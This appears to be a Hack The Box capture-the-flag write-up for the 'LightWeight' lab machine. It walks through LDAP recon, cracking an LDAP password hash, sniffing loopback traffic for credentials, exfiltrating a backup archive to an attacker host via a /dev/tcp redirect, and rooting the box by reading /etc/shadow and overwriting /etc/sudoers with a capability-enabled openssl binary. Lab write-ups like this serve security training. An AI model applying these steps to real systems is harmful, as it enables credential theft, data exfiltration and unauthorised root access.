# LightWeight Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA lightweight 10.10.10.119``

![image](https://user-images.githubusercontent.com/123066149/230068049-0ad3271d-20be-4627-8245-4429e0113d02.png)

``nmap -p- -sV -oA fullightweight 10.10.10.119``

![image](https://user-images.githubusercontent.com/123066149/230068172-aa331b6f-d01a-4559-9c92-85392cfd6713.png)

### We have this web interface :

![image](https://user-images.githubusercontent.com/123066149/230068387-3dbb2f3b-b7ea-404c-a43c-204cfc4ead25.png)

### We can ssh to the machine with user account :

![image](https://user-images.githubusercontent.com/123066149/230068533-66f687a9-615f-498b-9400-339fb663eb68.png)

![image](https://user-images.githubusercontent.com/123066149/230069025-076b8c50-a956-4994-8588-27477ba73f88.png)

### Password is the account name :

![image](https://user-images.githubusercontent.com/123066149/230069269-8f370a54-11c7-49ed-a6c9-7bc51e1bef5d.png)

### we can login in this box with the other account but not with ldapuser :

![image](https://user-images.githubusercontent.com/123066149/230069544-8c5dfca2-7bb9-47d3-a16a-8fd9b4fe5bd5.png)

### LDAP recon :

``ldapsearch -x -H ldap://10.10.10.119``

![image](https://user-images.githubusercontent.com/123066149/230069798-9312c24a-8f87-47a4-8b9d-1c98c44d6d38.png)

``ldapsearch -x -H ldap://10.10.10.119 -s base namingcontexts``

![image](https://user-images.githubusercontent.com/123066149/230070029-d966488e-e79c-4fd7-bf28-7b7ed7db8725.png)

``ldapsearch -x -H ldap://10.10.10.119 -b "dc=lightweight,dc=htb"``

![image](https://user-images.githubusercontent.com/123066149/230070264-b69be4bb-c4a2-48d4-9034-6222b1210d90.png)

### It's base64 encoded hash :

``echo -n "e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x" | base64 -d``

![image](https://user-images.githubusercontent.com/123066149/230070903-88fe5f12-4bce-4aa7-abf0-493fe7e9da45.png)

![image](https://user-images.githubusercontent.com/123066149/230071237-f88d895f-d66d-44ba-ad2d-8b5754f7d32e.png)

### We can remove crypt sting :

![image](https://user-images.githubusercontent.com/123066149/230071418-ae5ac718-720d-4faf-8ebb-0ce275e40e10.png)

![image](https://user-images.githubusercontent.com/123066149/230072436-9c8a425e-1381-4c4f-8beb-173dee4a699f.png)

``hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt``

![image](https://user-images.githubusercontent.com/123066149/230072705-978ea4db-64ef-4ece-9f23-a5958be5b789.png)

``john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt``

![image](https://user-images.githubusercontent.com/123066149/230072956-85e7133b-8fd2-4e0e-831d-869b767f74c3.png)

### In 2 clicks you can see the users leak with JXplorer :

![image](https://user-images.githubusercontent.com/123066149/230073556-99161c67-1c1e-4e67-b882-9ece584fdd31.png)

![image](https://user-images.githubusercontent.com/123066149/230073699-6f9cf8e6-2b1f-4205-8e6b-c47dc6a3a29a.png)

# ${{\color{purple}Initial Foothold}}\ $

### As user i runed linenum in the box :

![image](https://user-images.githubusercontent.com/123066149/230074213-b79819d4-48e0-4325-963e-07bf4ab215ab.png)

``ssh 10.10.16.2@10.10.10.119 "/usr/sbin/tcpdump -i ens160 -U -s0 -w - 'not port 22'" > lightweight.ens160.cap``

``wireshark lightweight.ens160.cap``

### Nothing on interface ens160 :

![image](https://user-images.githubusercontent.com/123066149/230074580-5d9af87f-8846-4993-9a15-cbc95f6a9414.png)

``ssh 10.10.16.2@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'" > lightweight.lo.cap ``

``wireshark lightweight.lo.cap``

![image](https://user-images.githubusercontent.com/123066149/230075967-16cef65c-3d3f-46c4-9d91-2ef92992c50e.png)

### Generate trafic to test :

![image](https://user-images.githubusercontent.com/123066149/230076081-4fd54c29-576e-4409-afa7-1066531865e7.png)

![image](https://user-images.githubusercontent.com/123066149/230076128-ccdca04f-b685-4eea-8f6f-74c1db522194.png)

### After reloading all the web page we have ldap trafic :

![image](https://user-images.githubusercontent.com/123066149/230076579-3faf5046-3cf8-4c8e-ae72-1d4d7406bb5b.png)

### Follow TCP Stream and we have ldapuser2 creds :

![image](https://user-images.githubusercontent.com/123066149/230076822-b47fcea8-ff60-4951-aacd-23db87c79d1a.png)

### I used the user 127.0.0.1 because 10.10.16.2 was not on sudoer file :

![image](https://user-images.githubusercontent.com/123066149/230079555-c007692e-ac97-4bc5-91b7-e063db60d68c.png)

# ${{\color{purple}Exploitation}}\ $

### We have backup.7z file on ldapuser2 desktop :
### File transfert without netcat :

``cat backup.7z > /dev/tcp/10.10.16.2/9001``

``nc -nlvp 9001 > backup.7z``

![image](https://user-images.githubusercontent.com/123066149/230080710-3ed3055d-033f-4401-9b1d-81ffc1991cfb.png)

### When i try 7z2john i have this error :

``7z2john backup.7z``

![image](https://user-images.githubusercontent.com/123066149/230080964-32cce931-2a5d-4532-93ac-50c999d8f91e.png)

### Install this for fixing the error message :

``apt install libcompress-raw-lzma-perl``

![image](https://user-images.githubusercontent.com/123066149/230081367-276d2b76-0aa0-45d1-8bb6-cab216feb8f1.png)

![image](https://user-images.githubusercontent.com/123066149/230083698-1b992505-7fd3-461c-b671-141b1abcc727.png)

``john backuphash.txt --wordlist=/usr/share/wordlists/rockyou.txt``

![image](https://user-images.githubusercontent.com/123066149/230083829-436f7b3e-ea80-46f3-b32a-38a4b4b7a8cf.png)

 ``7z x backup.7z``
 
 ![image](https://user-images.githubusercontent.com/123066149/230084395-bdb56dba-4309-4637-88dc-4144223609f4.png)

### In the status.php file we have ldapuser1 creds :

![image](https://user-images.githubusercontent.com/123066149/230084755-21f15dc7-35b9-4b66-9bbf-4d34ac3dc043.png)

 ``su - ldapuser1``
 
 ![image](https://user-images.githubusercontent.com/123066149/230094644-0b6e29e0-9115-4308-a4bd-bcce86bd09db.png)
 
# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/230097354-bfead45a-4da0-44d6-8ec0-c9908e221ea0.png)

``getcap *``

### ep = all acpability cela permet d'effectuer l'elevation des privilèges :

![image](https://user-images.githubusercontent.com/123066149/230096352-9df56fed-6be5-4290-a48e-32a591a19815.png)

``man capabilites``

![image](https://user-images.githubusercontent.com/123066149/230097488-fbb14914-e109-4482-9bd1-2c3e8d520ef3.png)

![image](https://user-images.githubusercontent.com/123066149/230097825-d97dea8e-e609-425c-b470-1acde7f6ec08.png)

``./openssl enc -in /etc/shadow``

![image](https://user-images.githubusercontent.com/123066149/230098099-85b70a6f-a841-4739-b05f-f8b5b5985d59.png)

``./openssl enc -in /etc/sudoers > sudoers``

![image](https://user-images.githubusercontent.com/123066149/230098782-293ab9dc-8202-4a0b-a847-bc9800c3b69f.png)

### Edit the sudoers file with vi or nano :

![image](https://user-images.githubusercontent.com/123066149/230099786-d8d76c62-2d2c-4ae3-8f38-bc43b65b140b.png)

### Cat the file and put the file in /etc/sudoers :

 ``cat ./sudoers | ./openssl enc -out /etc/sudoers``
 
 ![image](https://user-images.githubusercontent.com/123066149/230100637-bf027fd7-3562-4216-8639-46cdcef8257c.png)

 ``sudo su``
 
 ![image](https://user-images.githubusercontent.com/123066149/230100868-6a831a4e-8df6-4d08-9708-33e2493c0b8a.png)

 
# ${{\color{purple}Points of Improvement}}\ $
